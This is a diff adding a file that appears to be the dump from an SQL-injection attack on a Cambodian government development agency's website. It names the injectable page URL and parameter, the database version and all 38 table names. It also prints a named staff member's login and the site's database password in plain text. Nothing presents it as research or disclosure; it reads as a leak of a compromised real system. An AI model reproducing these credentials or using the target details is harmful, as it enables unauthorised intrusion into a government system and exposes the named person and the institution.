@@ -1,0 +1,77 @@
+.gov government
+
+.kh Cambodia (Khmer)
+
+Council for the Development of Cambodia
+
+Cambodian Rehabilitation and Development Board
+
+http://cdc-crdb.gov.kh/en/pressview.php?id=89
+
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+MySQL version: 5.5.5-10.3.17-MariaDB
+
+available databases [2]:                                                                                                                                             
+[+] cdccrdb_web
+[+] information_schema
+
+Database: cdccrdb_web                                                                                                                                                
+[38 tables]
++--------------------------+
+| tblabout_us              |
+| tblaccount               |
+| tblcategory              |
+| tblcontact               |
+| tbldcpr                  |
+| tbldcps                  |
+| tbldoc                   |
+| tbldocument              |
+| tbldocument_related      |
+| tbldp                    |
+| tbldp_name               |
+| tbljmi                   |
+| tbljob                   |
+| tbllast_update           |
+| tblmedia                 |
+| tblmenu                  |
+| tblministry              |
+| tblnewpage               |
+| tblngo                   |
+| tblother                 |
+| tblotherdoc              |
+| tblpress                 |
+| tblpress_content_img     |
+| tblpress_img             |
+| tblpublication           |
+| tblstrategy              |
+| tblstrategy_category     |
+| tblstrategy_doc          |
+| tblstrategy_gudeline     |
+| tblstrategy_gudeline_doc |
+| tblsubmenu               |
+| tbltor                   |
+| tbltwg                   |
+| tbltwg_guideline         |
+| tbltwg_name              |
+| tbltwg_sector_strategy   |
+| tblurl                   |
+| tblvisitor_counter       |
++--------------------------+
+
+Database: cdccrdb_web
+Table: tblaccount
+[1 entry]
++------------+---------+
+| Usr        | Pwd     |
++------------+---------+
+| meak.sambo | Rossa01 |
++------------+---------+
+
+Database: cdccrdb_web
+Table: mysql
++------------+---------+-------------+---------------+
+| server     | user    | database    | password      |
+|------------+---------+-------------+---------------+
+| localhost  | cdccrdb | cdccrdb_web | @cdccrdb$2020 |
++------------+---------+-------------+---------------+
